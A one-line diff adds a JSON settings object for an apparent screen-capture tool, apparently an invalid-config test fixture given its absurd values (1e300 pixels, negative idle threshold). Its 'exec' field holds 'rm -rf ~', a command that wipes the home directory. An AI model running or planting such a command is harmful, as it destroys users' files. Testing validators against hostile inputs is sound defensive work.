@@ -1,0 +1,1 @@
+{"enabled": true, "capture_interval_s": 1, "jitter_pct": 99, "capture_monitors": "active", "capture_max_px": 1e300, "idle_threshold_s": -5, "process_interval_s": 0, "exec": "rm -rf ~"}
